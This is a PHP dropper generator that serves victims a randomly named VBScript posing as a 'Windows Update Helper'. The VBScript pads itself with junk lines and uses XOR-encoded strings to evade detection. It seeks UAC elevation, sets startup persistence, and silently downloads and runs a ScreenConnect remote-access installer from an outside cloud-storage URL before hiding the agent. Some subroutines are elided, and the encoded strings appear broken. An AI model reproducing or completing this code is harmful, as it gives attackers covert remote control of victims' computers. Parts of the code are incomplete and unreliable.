<?php
// invite.php - With Debug Logging
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$baseNames = [ /* your list */ ];
// ... (keep the same filename logic as last version)

$chosen = $chosenBase . "_" . $random5 . ".vbs";
header('Content-Disposition: attachment; filename="' . $chosen . '"');

$scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";

$sessionId = bin2hex(random_bytes(24));
$ts        = time();
$randV1    = 'v' . substr(md5(random_bytes(8)), 0, 12);
$randFunc  = 'f' . substr(md5(random_bytes(8)), 0, 10);
$xorKey    = rand(100, 255);

$junkLines = rand(12, 45);
$junk = "";
for ($i = 0; $i < $junkLines; $i++) {
    $junk .= "' Junk " . bin2hex(random_bytes(rand(8, 22))) . "\n";
}

echo <<<VBS
' Windows Update Helper - $ts - DEBUG ENABLED

Dim $randV1, objShell, objFSO, logFile
Set objShell = CreateObject("WScript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")

$randV1 = "$sessionId"
logFile = objShell.ExpandEnvironmentStrings("%TEMP%\\debug_log.txt")

Sub Log(msg)
    On Error Resume Next
    Dim f
    Set f = objFSO.OpenTextFile(logFile, 8, True)
    f.WriteLine "[" & Now & "] " & msg
    f.Close
End Sub

Call Log("Script started - Session: $sessionId")

Function D(s)
    Dim i, r : r = ""
    For i = 1 To Len(s)
        r = r & Chr(Asc(Mid(s, i, 1)) Xor $xorKey)
    Next
    D = r
End Function

' ... (keep IsElevated, Elevate, AddToStartup, DownloadAndExecute, HideAgent) ...

Sub $randFunc
    On Error Resume Next
    Call Log("Main function started")
    If Not IsElevated Then 
        Call Log("Not elevated - requesting UAC")
        Call Elevate
    Else
        Call Log("Already elevated")
    End If
    Call AddToStartup
    Call DownloadAndExecute
    Call HideAgent
    Call Log("Script finished")
End Sub

' ... rest of subs with Log calls added ...

Sub DownloadAndExecute()
    On Error Resume Next
    Call Log("Starting download from: $scUrl")
    Dim u, p, http, strm
    u = "$scUrl"
    p = objShell.ExpandEnvironmentStrings(D("%UFNQ%\\xvfomqfs.fyf"))
    
    Set http = CreateObject(D("NTYNM2.YNMHTTP"))
    http.Open "GET", u, False
    http.Send
    Call Log("HTTP Status: " & http.Status)
    If http.Status = 200 Then
        Set strm = CreateObject(D("BEPEC.Stream"))
        strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
        Call Log("Downloaded to: " & p)
        objShell.Run """" & p & """ -silent", 0, True
        Call Log("Installer executed")
        WScript.Sleep 5000
        If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
    Else
        Call Log("Download failed")
    End If
End Sub

' ... (add Log to other subs similarly) ...

$junk
Call $randFunc
WScript.Quit
VBS;
?>
